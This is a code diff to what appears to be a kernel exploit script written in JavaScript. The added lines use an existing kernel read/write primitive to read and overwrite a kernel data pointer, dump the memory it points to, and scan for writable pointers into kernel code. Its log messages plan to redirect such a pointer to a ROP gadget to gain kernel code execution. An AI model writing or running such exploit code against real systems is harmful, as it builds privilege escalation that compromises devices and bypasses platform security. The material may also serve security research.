@@ -887,6 +887,39 @@ async function main(userlandRW, wkOnly = false) {
                         await log("[TEST] Saving original value...", LogLevel.INFO);
                         let original = await krw.read8(krw.kdataBase.add32(0x4a48));
 
+                        // Calculate offset from ktextBase
+                        await log("[ANALYSIS] Pointer value: " + original, LogLevel.INFO);
+                        await log("[ANALYSIS] ktextBase: " + krw.ktextBase, LogLevel.INFO);
+
+                        // Calculate the offset this pointer represents
+                        let ptrOffset = original.low - krw.ktextBase.low;
+                        await log("[ANALYSIS] Pointer offset from ktextBase: 0x" + ptrOffset.toString(16), LogLevel.SUCCESS);
+
+                        // Read what the pointer points to
+                        await log("[ANALYSIS] Reading target of pointer...", LogLevel.WARN);
+                        try {
+                            // Read first 64 bytes at the target
+                            await log("[TARGET] Contents at pointer target:", LogLevel.INFO);
+                            for (let i = 0; i < 8; i++) {
+                                let v = await krw.read8(original.add32(i * 8));
+                                await log("  +" + (i * 8).toString(16) + ": " + v, LogLevel.INFO);
+                            }
+
+                            // Check if the target looks like code or data
+                            let firstByte = await krw.read1(original);
+                            let secondByte = await krw.read1(original.add32(1));
+                            await log("[TARGET] First bytes: " + firstByte.toString(16) + " " + secondByte.toString(16), LogLevel.INFO);
+
+                            // Common function prologues: 55 (push rbp), 48 89 (mov), etc.
+                            if (firstByte === 0x55 || (firstByte === 0x48 && secondByte === 0x89)) {
+                                await log("[TARGET] Looks like CODE (function prologue detected)!", LogLevel.SUCCESS);
+                            } else if (firstByte === 0x00 && secondByte === 0x00) {
+                                await log("[TARGET] Looks like DATA (zeros)", LogLevel.INFO);
+                            }
+                        } catch (e) {
+                            await log("[TARGET] Could not read: " + e, LogLevel.ERROR);
+                        }
+
                         await log("[TEST] Writing test value (original XOR 0x1000)...", LogLevel.WARN);
                         let testVal = new int64(original.low ^ 0x1000, original.hi);
                         await krw.write8(krw.kdataBase.add32(0x4a48), testVal);
@@ -903,6 +936,37 @@ async function main(userlandRW, wkOnly = false) {
                             await krw.write8(krw.kdataBase.add32(0x4a48), original);
                             let restored = await krw.read8(krw.kdataBase.add32(0x4a48));
                             await log("[TEST] Restored: " + restored, LogLevel.SUCCESS);
+
+                            // NOW THE KEY QUESTION: Can we exploit this?
+                            await log("========== EXPLOITATION ANALYSIS ==========", LogLevel.SUCCESS);
+                            await log("[EXPLOIT] We have a writable kernel pointer at kdataBase+0x4a48", LogLevel.WARN);
+                            await log("[EXPLOIT] It points to ktextBase+0x" + ptrOffset.toString(16), LogLevel.WARN);
+                            await log("[EXPLOIT] Potential attack vectors:", LogLevel.INFO);
+                            await log("  1. If this is a function pointer -> redirect to ROP gadget", LogLevel.INFO);
+                            await log("  2. If this is a data pointer -> redirect to controlled data", LogLevel.INFO);
+                            await log("  3. Search for more writable pointers in 0x0-0xF000 region", LogLevel.INFO);
+
+                            // Scan for ALL writable pointers that point to kernel .text
+                            await log("[SCAN] Scanning for function pointers (pointing to .text)...", LogLevel.WARN);
+
+                            let textPointers = [];
+                            for (let ptr of foundPointers) {
+                                // Check if pointer points near ktextBase (within ~16MB)
+                                let offset = ptr.value.low - krw.ktextBase.low;
+                                if (offset >= 0 && offset < 0x1000000) {  // Within 16MB of text
+                                    textPointers.push({ ...ptr, textOffset: offset });
+                                    await log("[FUNCPTR] 0x" + ptr.offset.toString(16) +
+                                        " -> ktextBase+0x" + offset.toString(16), LogLevel.SUCCESS);
+                                }
+                            }
+
+                            await log("[SCAN] Found " + textPointers.length + " pointers to kernel .text!", LogLevel.SUCCESS);
+
+                            if (textPointers.length > 0) {
+                                await log("[EXPLOIT] These could be FUNCTION POINTERS!", LogLevel.WARN);
+                                await log("[EXPLOIT] If we redirect one to a ROP gadget and trigger its call...", LogLevel.WARN);
+                                await log("[EXPLOIT] ...we could gain kernel code execution!", LogLevel.SUCCESS);
+                            }
                         } else {
                             await log("[TEST] Write may have failed or been blocked", LogLevel.WARN);
                         }
